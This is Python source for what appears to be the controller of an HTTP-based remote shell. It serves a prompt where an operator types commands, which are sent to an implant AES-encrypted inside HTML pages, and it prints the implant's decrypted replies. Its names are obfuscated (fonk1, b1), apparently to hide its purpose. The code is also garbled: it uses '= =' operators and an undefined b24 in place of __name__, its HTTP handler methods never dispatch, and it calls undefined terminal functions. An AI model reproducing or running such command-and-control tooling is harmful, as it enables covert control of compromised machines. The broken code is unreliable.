import pyaes
import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
from time import sleep
from sys import stdin, argv
b1 = b"This_key_for_demo_purposes_only!"
def fonk1(b9):
    b2 = pyaes.AESModeOfOperationCTR(b1)
    b3 = b2.encrypt(b9)
    b4 = base64.b64encode(b3).decode()
    return b4
def fonk2(b9):
    b2 = pyaes.AESModeOfOperationCTR(b1)
    b5 = base64.b64decode(b9)
    b6 = b2.decrypt(b5).decode('utf-8')
    return b6
b7 = []
class class1(BaseHTTPRequestHandler):
    def fonk3(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
    def fonk4(self):
        self.fonk3()
        b8 = b7
        try:
            b9 = input('$ ')
        except KeyboardInterrupt:
            b10 = input('Quit? (y/n/r/c)')
            if b10 = = 'y':
                exit(0)
            elif b10 = = 'r':
                print('Restarting server ...')
                return False
            elif b10 = = 'c':
                print('Command history: ')
                for cmd in b8:
                    print(cmd)
            else:
                print('Waiting for reconnection ...')
                return
        else:
            b8.append(b9)
            b9 = fonk1(b9)
            b11 = ("<html><body><h1>%s</h1></body></html>" % b9).encode()
            try:
                self.wfile.write(b11)
            except BrokenPipeError:
                print('Broken Pipe, wait for reconnection ... ')
    def fonk5(self):
        self.fonk3()
    def fonk6(self):
        self.fonk3()
        b12 = int(self.headers['Content-Length'])
        b13 = self.rfile.read(b12)
        b13 = str(b13)
        b14 = b13.strip('<html><body><h1>')
        b14 = b13.strip('</h1></body></html>')
        b15 = fonk2(b14)
        print(b15)
        return
    def fonk7(self, format, *args):
        return
"""class class2:
    def fonk8(self):
        b16 = stdin.fileno()
        b17 = tcgetattr(b16)
        try:
            setraw(stdin.fileno())
            b18 = stdin.read(3)
        finally:
            tcsetattr(b16, TCSADRAIN, b17)
        return b18
def fonk9():
    b19 = class2()
    while(1):
            b20 = b19()
            if b20 != '':break
    if b20 = = '\x1b[A':
        print("up")
    elif b20 = = '\x1b[B':
        print("down")
    else:
        pass"""
def fonk10(b21 = HTTPServer, handler_class=class1, b25=80):
    b22 = ('0.0.0.0', b25)
    b23 = b21(b22, handler_class)
    print('Starting b23 on %s:%d...' % (b22, b25))
    while True:
        b23.serve_forever()
        print('Restarting server ... ')
        sleep(1)
if b24 = = "__main__":
    if len(argv) == 2:
        fonk10(b25 = int(argv[1]))
    else:
        fonk10(b25 = 8880)